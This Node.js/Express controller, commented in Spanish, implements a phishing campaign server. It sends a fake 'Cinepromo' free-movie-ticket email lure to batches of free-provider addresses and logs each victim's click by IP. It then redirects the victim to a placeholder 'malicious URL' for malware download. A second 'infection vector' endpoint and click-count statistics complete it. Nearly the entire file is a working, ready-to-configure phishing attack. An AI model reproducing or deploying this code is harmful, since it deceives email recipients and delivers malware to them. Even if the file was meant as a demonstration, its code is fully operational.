const phishingCtrl = {};

// MODELOS
const session_data = require('../models/session_data');
const session_phishing = require('../models/session_email_phishing');
const session_vector = require('../models/session_email_vector');

// EXTRAS
const nodeMailer = require('nodemailer');

// CUSTOM RESPONSE
var response = {
    status: String,
    ip_exist: Boolean,
    valid_mails: Array,
    invalid_mails: Array
}

// ENVIO DE PHISHING
phishingCtrl.sendEmail = async (req, res) => {

    var arrEmails = req.body

    console.log(arrEmails);

    var arrValidMails = [];
    var arrInvalidMails = [];
    var badMails = false;

    // OBTENCION DE IP
    var ip_address = req.headers['x-forwarded-for'] || req.connection.remoteAddress.split(`:`).pop();

        // RESTRICCION DE USO POR IP
        session_data.aggregate(
            [ 
                { "$group":  { "_id": "$ip4", "count": { "$sum": 1 } } }
            ],  
            function(err, results) {
                console.log(results);

                var cont = 0;

                if (results.length > 0 ) {
                    
                    cont = results[0]['count']
                }

                // RESTRICCION
                if (cont >= 3) {

                    response.ip_exist = true;
                    response.status = 'quota_exceeded';
                }
                else {

                    // VALIDA EMAILS DE PROVEEDORES GRATUITOS
                    arrEmails.forEach(mail => {
                        
                        if ( /@(gmail.com|hotmail.com|outlook.com|outlook.es|yahoo.com|yahoo.es)$/.test(mail) ) {

                            console.log(mail+" is valid");
                            arrValidMails.push(mail);

                        }
                        else {
                            console.log(mail+" is not valid");
                            arrInvalidMails.push(mail);
                            badMails = true;
                        }

                    });

                    if (badMails) {
                        response.status = 'mail_not_authorized'
                        response.invalid_mails = arrInvalidMails;

                    } else {

                        // INSERCIÓN EN MONGO DB
                        var doc = new session_data({
                            ip4: ip_address,
                            emails: arrValidMails
                        });
                    
                        doc.save(function (err) {
                            if (err) return handleError(err);
                        });

                        // ENVÍO SIMULTANEO
                        arrEmails.forEach(mail => {

                            // INGRESA AQUI TUS CREDENCIALES DE PROVEEDOR DE CORREO
                            let transporter = nodeMailer.createTransport({
                                
                                host: 'YOUR_MAIL_HOST',
                                port: XXX,
                                secure: false,
                                requireTLS: true,
                                auth: {
                                    user: 'YOUR_EMAIL_ADDRESS',
                                    pass: 'YOUR_PASSWORD'
                                }
                            });

                            // PERSONALIZACIÓN DE PLANTILLA DE PHISHING
                            let mailOptions = {
                                from: '"Cine Promo" <EMAIL_ADDRESS>',
                                to: mail, // list of receivers
                                subject: 'Oferta Cinepromo', // Subject line
                                text: '', // plain text body
                                html: '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">'+
                                '<html style="opacity: 1;" xmlns="http://www.w3.org/1999/xhtml">'+
                                '  <head>'+
                                '    <meta charset="utf-8">'+
                                '    <meta content="width=device-width" name="viewport">'+
                                '    <meta content="IE=edge" http-equiv="x-ua-compatible">'+
                                '    <meta name="x-apple-disable-message-reformatting">'+
                                '    <title>CINEPROMO</title>'+
                                '    '+
                                '  <style type="text/css">'+
                                '				p{'+
                                '			margin:10px 0;'+
                                '			padding:0;'+
                                '		}'+
                                '		table{'+
                                '			border-collapse:collapse;'+
                                '		}'+
                                '		h1,h2,h3,h4,h5,h6{'+
                                '			display:block;'+
                                '			margin:0;'+
                                '			padding:0;'+
                                '		}'+
                                '		img,a img{'+
                                '			border:0;'+
                                '			height:auto;'+
                                '			outline:none;'+
                                '			text-decoration:none;'+
                                '		}'+
                                '		body,#bodyTable,#bodyCell{'+
                                '			height:100%;'+
                                '			margin:0;'+
                                '			padding:0;'+
                                '			width:100%;'+
                                '		}'+
                                '		.mcnPreviewText{'+
                                '			display:none !important;'+
                                '		}'+
                                '		#outlook a{'+
                                '			padding:0;'+
                                '		}'+
                                '		img{'+
                                '			-ms-interpolation-mode:bicubic;'+
                                '		}'+
                                '		table{'+
                                '			mso-table-lspace:0pt;'+
                                '			mso-table-rspace:0pt;'+
                                '		}'+
                                ''+
                                '}</style></head>'+
                                '  <body bgcolor="#fafafa" style="margin: 0px; background-color: #fafafa;" width="100%">'+
                                '    <center style="width:100%;text-align:left;background-color:#fafafa;">'+
                                '      <!-- Email Body : BEGIN -->'+
                                '      <table align="center" border="0" cellpadding="0" cellspacing="0" class="email-container" role="presentation" style="margin:auto;" width="600">'+
                                '        <tbody>'+
                                '          <!-- 2 Even Columns : BEGIN -->'+
                                '          <tr>'+
                                '            <td align="center" width="100%" bgcolor="#339bff" valign="top" style="padding:20px 30px 5px 30px;text-align:center;">'+
                                '                      <img alt="SpotHero" border="0" class="logo" src="https://gallery.mailchimp.com/3cbdc053ee4ba5d53025c3258/images/53e43fe7-f258-4889-b14d-f536014a241c.png" style="height: auto; font-size: 25px;line-height: 30px;" width="75">'+
                                '                </td>'+
                                '              </tr>'+
                                '              <!-- 2 Even Columns : END -->'+
                                '              <!-- Hero Image : BEGIN -->'+
                                '              <tr>'+
                                '                <td align="center">'+
                                '                  <a href="#%23">'+
                                '                    <img alt="##" border="0" class="g-img" src="https://gallery.mailchimp.com/3cbdc053ee4ba5d53025c3258/images/18ceb307-4e3e-43cd-ab84-b3ab52d81c8e.jpg" style="width: 100%; max-width: 600px; height: auto; font-size: 25px;line-height: 30px;color: #135aff; font-weight: bold;" width="600"></a>'+
                                '                  </td>'+
                                '                </tr>'+
                                '                <!-- Hero Image : END -->'+
                                '                <!-- Email Body Text : BEGIN -->'+
                                '                <tr>'+
                                '                  <td bgcolor="#ffffff" class="mobile_text" style="padding:20px 25px 0 25px;text-align:left;font-size:20px;line-height:28px;color:#0082ff;font-weight:100;">'+
                                '                    Cinepromo, Fast & Furious: Hobbs & Shaw'+
                                '                  </td>'+
                                '                </tr>'+
                                '                <tr>'+
                                '                  <td bgcolor="#ffffff" class="mobile_text" style="padding:5px 25px 0 25px;text-align:left;font-size:16px;line-height:24px;color:#000000;font-weight:100;">'+
                                '                    Estimado(a) has sido seleccionad(a) para cobrar <strong>2 entradas gratuitas</strong> para que disfrutes de la nueva cinta de acción.'+
                                '                  </td>'+
                                '                </tr>'+
                                '                <!-- Email Body Text : END -->'+
                                '                <!-- CTA Button : BEGIN -->'+
                                '                <tr>'+
                                '                  <td bgcolor="#ffffff" class="mobile_text-2" style="padding:30px 50px 20px;text-align:center;font-size:15px;line-height:26px;color:#002d5b;font-weight:100;">'+
                                '                    <div>'+
                                '                      <!--[if mso]>'+
                                '                      <v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" href="##" style="height:40px;v-text-anchor:middle;width:400px;" arcsize="50%" stroke="f" fillcolor="#0082ff">'+
                                '                        '+
                                '                        <center>'+
                                '                          <![endif]--><a href="http://YOUR_API_ADDRESS:PORT/api/phishing/pwnedPhishing" target="_self" style="background-color:#0082ff;border-radius:40px;color:#ffffff;display:inline-block;font-size:20px;font-weight:100;line-height:45px;text-align:center;text-decoration:none;width:80%;-webkit-text-size-adjust:none;" class="button-a-span">VER ENTRADAS</a>'+
                                '                      <!--[if mso]>'+
                                '                    </center>'+
                                '                  </v:roundrect>'+
                                '                  <![endif]-->'+
                                '                    </div>'+
                                '                  </td>'+
                                '                </tr>'+
                                '                <!-- CTA Button : END -->'+
                                '                <!-- Offer Details : BEGIN -->'+
                                '                <tr>'+
                                '                  <td bgcolor="#ffffff" class="mobile_text" style="padding:20px 50px;text-align:justify;font-size:11px;color:#5c7996;font-weight:100; font-style: italic;">'+
                                '                   La información contenida en este archivo, así como en cualquiera de sus adjuntos, es confidencial y está dirigida exclusivamente a él o los destinatarios indicados. Cualquier uso, reproducción, divulgación o distribución por otras personas distintas de el o los destinatarios está estrictamente prohibida. Si ha recibido este correo por error, por favor notifícalo inmediatamente al remitente y bórrelo de su sistema sin dejar copia del mismo.'+
                                '                  </td>'+
                                '                </tr>'+
                                '                <!-- Offer Details : END -->'+
                                '              </tbody>'+
                                '            </table>'+
                                '            <!-- Email Body : END -->'+
                                '            <!-- Email Footer : BEGIN -->'+
                                '            <table align="center" bgcolor="#ebeff2" border="0" cellpadding="0" cellspacing="0" class="email-container" role="presentation" style="margin:auto;" width="600">'+
                                '              <tbody>'+
                                '                <!-- 3 Even Columns : BEGIN -->'+
                                '                <tr>'+
                                '                  <td align="center" valign="top" style="padding:30px 0 0 0;">'+
                                '                    <table role="presentation" cellspacing="0" cellpadding="0" border="0" width="200">'+
                                '                      <tr>'+
                                '                        <!-- Column : BEGIN -->'+
                                '                        <td width="25%">'+
                                '                          <table role="presentation" cellspacing="0" cellpadding="0" border="0">'+
                                '                            <tr>'+
                                '                              <td style="text-align:center;">'+
                                '                                <a href="#" style="text-decoration:none;border-collapse:collapse;mso-line-height-rule:exactly;" target="_blank">'+
                                '                                  <img alt="Twitter" border="0" src="http://res.cloudinary.com/spothero/image/upload/v1509555113/html-emails/soc_icon_twitter.png" style="display: block;font-size: 14px;line-height: 18px;color: #404040;font-weight: bold;border: 0 !important;outline: none !important; max-width:35px;" width="35"></a>'+
                                '                                </td>'+
                                '                              </tr>'+
                                '                            </table>'+
                                '                          </td>'+
                                '                          <!-- Column : END -->'+
                                '                          <!-- Column : BEGIN -->'+
                                '                          <td width="25%">'+
                                '                            <table role="presentation" cellspacing="0" cellpadding="0" border="0">'+
                                '                              <tr>'+
                                '                                <td style="text-align:center;">'+
                                '                                  <a href="#" style="text-decoration:none;border-collapse:collapse;mso-line-height-rule:exactly;" target="_blank">'+
                                '                                    <img alt="YouTube" border="0" src="http://res.cloudinary.com/spothero/image/upload/v1509555113/html-emails/soc_icon_ytube.png" style="display: block; font-size: 14px; line-height: 18px;color: #404040;font-weight: bold;border: 0 !important;outline: none !important; max-width:35px;" width="35"></a>'+
                                '                                  </td>'+
                                '                                </tr>'+
                                '                              </table>'+
                                '                            </td>'+
                                '                            <!-- Column : END -->'+
                                '                            <!-- Column : BEGIN -->'+
                                '                            <td width="25%">'+
                                '                              <table role="presentation" cellspacing="0" cellpadding="0" border="0">'+
                                '                                <tr>'+
                                '                                  <td style="text-align:center;">'+
                                '                                    <a href="#" style="text-decoration:none;border-collapse:collapse;mso-line-height-rule:exactly;" target="_blank">'+
                                '                                      <img alt="Instagram" border="0" src="http://res.cloudinary.com/spothero/image/upload/v1509555113/html-emails/soc_icon_insta.png" style="display: block;font-size: 14px;line-height: 18px;color: #404040;font-weight: bold;border: 0 !important;outline: none !important; max-width:35px;" width="35"></a>'+
                                '                                    </td>'+
                                '                                  </tr>'+
                                '                                </table>'+
                                '                              </td>'+
                                '                              <!-- Column : END -->'+
                                '                              <!-- Column : BEGIN -->'+
                                '                              <td width="25%">'+
                                '                                <table role="presentation" cellspacing="0" cellpadding="0" border="0">'+
                                '                                  <tr>'+
                                '                                    <td style="text-align:center;">'+
                                '                                      <a href="#" style="text-decoration:none;border-collapse:collapse;mso-line-height-rule:exactly;" target="_blank">'+
                                '                                        <img alt="Facebook" border="0" src="http://res.cloudinary.com/spothero/image/upload/v1509555113/html-emails/soc_icon_fb.png" style="display: block;font-size: 14px;line-height: 18px;color: #404040;font-weight: bold;border: 0 !important;outline: none !important; max-width:35px;" width="35"></a>'+
                                '                                      </td>'+
                                '                                    </tr>'+
                                '                                  </table>'+
                                '                                </td>'+
                                '                                <!-- Column : END -->'+
                                '                              </tr>'+
                                '                            </table>'+
                                '                          </td>'+
                                '                        </tr>'+
                                '                        <!-- 3 Even Columns : END -->'+
                                '                        <!-- Address : BEGIN -->'+
                                '                        <tr>'+
                                '                          <td align="center" class="em_font13" style="border-collapse:collapse;mso-line-height-rule:exactly;color:#5C7996;font-size:13px;text-decoration:none;padding:10px 0 0 0;" valign="top">'+
                                '                          Providencia  |  Santiago, Chile'+
                                '                          </td>'+
                                '                        </tr>'+
                                '                        <tr>'+
                                '                          <td align="center" class="em_font13" style="border-collapse:collapse;mso-line-height-rule:exactly;color:#5C7996;font-size:13px;text-decoration:none;padding:5px 0 5px 0;" valign="top">'+
                                '                          (312) 566-7768 | FAQ'+
                                '                          </td>'+
                                '                        </tr>'+
                                '                        <!-- Address : END -->'+
                                '                        <!-- Clear Spacer : BEGIN -->'+
                                '                        <tr>'+
                                '                          <td height="30" style="font-size:0;line-height:0;"> '+
                                '                            '+
                                '                          </td>'+
                                '                        </tr>'+
                                '                        <!-- Clear Spacer : END -->'+
                                '                      </tbody>'+
                                '                    </table>'+
                                '                    <!-- Email Footer : END -->'+
                                '                  </center>'+
                                '                </body>'+
                                '</html>'
                            };

                            transporter.sendMail(mailOptions);

                            response.status = 'mail_sent'

                        });
                    }
                    
                }

                res.json(response)

            }
        );   

};

// 1° INFECCION - VIA CORREO 
phishingCtrl.pwnedPhishing = async (req, res) => {

    var ip_address = req.headers['x-forwarded-for'] || req.connection.remoteAddress.split(`:`).pop();

    var doc = new session_phishing({
        ip4: ip_address,
        timestamp: new Date
    });

    doc.save(function (err) {
        if (err) return handleError(err);
    });
      
    // REDIRECCIÓN A SITIO MALICIOSO O DESCARGA DE MALWARE
    res.redirect('YOUR_MALICIOUS_URL');
}

// 2° INFECCION - VECTOR A ELECCION
phishingCtrl.pwnedVector = async (req, res) => {

    var ip_address = req.headers['x-forwarded-for'] || req.connection.remoteAddress.split(`:`).pop();

    var doc = new session_macros({
        ip4: ip_address,
        timestamp: new Date
    });

    doc.save(function (err) {
        if (err) return handleError(err);
    });

    res.json(doc);
}

// ESTADISTICAS *OPCIONAL
phishingCtrl.getPhishingUsers = async (req, res) => {

    const count = await session_phishing.countDocuments();

    res.json(count);

}

phishingCtrl.getVectorUsers = async (req, res) => {

    const count = await session_vector.countDocuments();

    res.json(count);

}

module.exports = phishingCtrl;